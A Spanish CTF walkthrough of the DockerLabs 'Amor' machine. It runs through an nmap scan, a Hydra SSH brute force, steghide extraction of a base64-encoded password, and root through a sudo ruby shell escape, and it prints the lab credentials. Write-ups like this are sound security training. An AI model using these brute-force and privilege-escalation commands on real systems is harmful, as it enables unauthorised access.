# Amor — DockerLabs.es 🐳

<img width="548" height="298" alt="1" src="https://github.com/user-attachments/assets/24957a86-8f7b-4dec-886f-35e5d5860f4c" />

**Plataforma**: DockerLabs | **OS**: Linux | **Dificultad**: Fácil

---

## 1. Reconocimiento

Realizamos un escaneo con Nmap:

```bash
sudo nmap -p- --min-rate 2000 -A -sS -Pn -n 172.17.0.2 -oN escaneo.txt
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-30 12:05 EST
Nmap scan report for 172.17.0.2
Host is up (0.000058s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e:72:b6:8b:5f:7c:23:64:dc:15:21:32:5f:ce:40:0a (ECDSA)
|_  256 05:8a:a7:27:0f:88:b9:70:84:ec:6d:33:dc:ce:09:6f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: SecurSEC S.L
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.06 ms 172.17.0.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.93 seconds
```

Tenemos el puerto 22 y 80 abiertos.

Entramos la puerto 80 para ver qué contiene la página web:

<img width="1121" height="604" alt="2" src="https://github.com/user-attachments/assets/b3e5fd01-697b-480f-a698-a85c64a3d034" />

Y encontramos dos posibles usuarios: Juan y Carlota.
---

## 2. Explotación

Para la explotación podemos realizar un ataque de fuerza bruta al puerto 22 con estos dos usuarios, primero probamos con “Carlota”

```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

<img width="722" height="277" alt="3" src="https://github.com/user-attachments/assets/1a3504b5-8eed-428e-b620-1384a120fb56" />

Conseguimos las credenciales:

Usuario: `Carlota`

Password: `babygirl`

Ingresamos estas credenciales en el servicio ssh:

```bash
ssh carlota@172.17.0.2 
```
---

## 3. Escalada de Privilegios


Una vez dentro nos encargamos de poner un prompt con el comando:

```bash
script /dev/null -c bash
```

<img width="605" height="334" alt="4" src="https://github.com/user-attachments/assets/d0e997af-39a3-4b23-8faf-b72b4d792b31" />

Si vamos al /home podemos ver que hay dos usuarios: Carlota y Oscar. 

Entramos al directorio de Carlota

<img width="490" height="151" alt="5" src="https://github.com/user-attachments/assets/f6a22e27-834c-48e1-989f-f7fbb49b9210" />

vamos al directorio: /Desktop/fotos/vacaciones y encontraremos un archivo “imagen.jpg”

<img width="476" height="290" alt="6" src="https://github.com/user-attachments/assets/78eb03d6-91ec-408f-ab99-83f04bd89302" />

Descargamos el archivo desde la maquina atacante con el comando scp de la siguiente forma:

```bash
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Desktop
```

La ruta azul es dónde se encuentra el archivo que queremos descargar y la ruta verde es donde la queremos almacenar

Una vez descargado, le aplicamos técnicas de esteganografía, en este caso utilizamos el comando steghide Y se nos extraerá un archivo “secret.txt”

```bash
steghide extract -sf imagen.jpg
```

<img width="358" height="91" alt="7" src="https://github.com/user-attachments/assets/34de678f-696c-43c7-9b87-78441e8eb925" />

Si le hacemos un cat a este archivo, nos dará un output encodeado en base64

<img width="271" height="61" alt="8" src="https://github.com/user-attachments/assets/83103ef0-1fa6-4305-a124-382360ee93fa" />

```bash
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d 
```

Desencodeamos este texto y nos dará la contraseña en texto claro

<img width="399" height="73" alt="9" src="https://github.com/user-attachments/assets/794a5577-c6c2-4e4f-a855-e4723369bb12" />

`eslacasadepinypon`

Probamos esa contraseña con el usuario “Oscar”.

Y logramos obtener acceso

<img width="451" height="157" alt="10" src="https://github.com/user-attachments/assets/10c97bc7-e946-4005-b3e5-2905861d957c" />

Si hacemos un sudo -l podemos ver que tenemos acceso al binaro “ruby”

<img width="479" height="132" alt="11" src="https://github.com/user-attachments/assets/65fdf81e-58b7-4f01-8d91-1dee70be4d18" />

Buscamos este binario en GTFObins y ponemos el siguiente comando:

```bash
sudo ruby -e 'exec "/bin/bash"'
```

Y así conseguimos rootear la máquina

<img width="540" height="130" alt="12" src="https://github.com/user-attachments/assets/63e08e1f-52ca-4d0f-a403-2c49f8717459" />

**✅ Máquina rooteada con éxito.**

---

## 4. Técnicas utilizadas

- Reconocimiento con Nmap
- Enumeración de servicios
- Escalada de privilegios
